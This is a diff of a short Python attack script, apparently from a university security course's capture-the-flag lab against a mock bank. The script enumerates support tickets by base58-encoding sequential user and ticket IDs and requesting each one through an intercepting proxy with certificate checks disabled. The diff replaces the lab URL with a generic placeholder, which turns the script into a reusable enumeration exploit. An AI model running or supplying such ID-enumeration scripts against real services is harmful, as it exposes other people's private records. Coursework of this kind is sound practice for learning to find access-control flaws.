@@ -5,7 +5,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 import base58
 # /* https://github.com/keis/base58 */
-
+# /* support flag */
 proxy = {
     'https': 'http://127.0.0.1:8080',
     'http': 'http://127.0.0.1:8080'
@@ -24,7 +24,7 @@ header = {
 # for i in range (0, 10000):
 #     string = str(i) + ':1'
 #     encoded_str = base58.b58encode(string.encode('UTF-8'))
-#     request_url = "https://support.quoccabank.com/raw/" + encoded_str.decode('utf-8')
+#     request_url = "{website}" + encoded_str.decode('utf-8')
 #     r = requests.get(request_url, proxies=proxy, verify=False, headers=header)
 #     # if (("b\'Support Ticket").encode('utf-8') in r.content): 
 #     print(f'USER:{i} >>>> {r.content}', flush=true)
@@ -35,7 +35,7 @@ header = {
 for i in range(1, 10000): 
     string = "1125" + ":" + str(i) 
     encoded_str = base58.b58encode(string.encode('UTF-8'))
-    request_url = "https://support.quoccabank.com/raw/" + encoded_str.decode('utf-8')
+    request_url = "{website}" + encoded_str.decode('utf-8')
     r = requests.get(request_url, proxies=proxy, verify=False, headers=header)
     # if (("COMP6443{").encode('utf-8') in r.content): 
     print(f'247:{i} >>>> {r.content}', flush=True) 
